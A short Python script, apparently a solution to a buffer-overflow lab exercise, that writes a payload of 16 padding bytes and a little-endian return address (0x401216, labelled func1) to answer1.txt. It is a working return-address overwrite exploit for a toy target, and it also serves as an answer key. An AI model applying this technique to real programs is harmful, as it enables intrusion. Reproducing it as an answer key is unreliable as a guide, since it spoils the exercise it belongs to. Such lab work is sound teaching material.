import struct

padding = b'A' * 16
# 目标地址 func1: 0x401216
target_addr = b'\x16\x12\x40\x00'

# Payload
payload = padding + target_addr
# 写入
with open('answer1.txt', 'wb') as f:
    f.write(payload)
print("answer1已生成")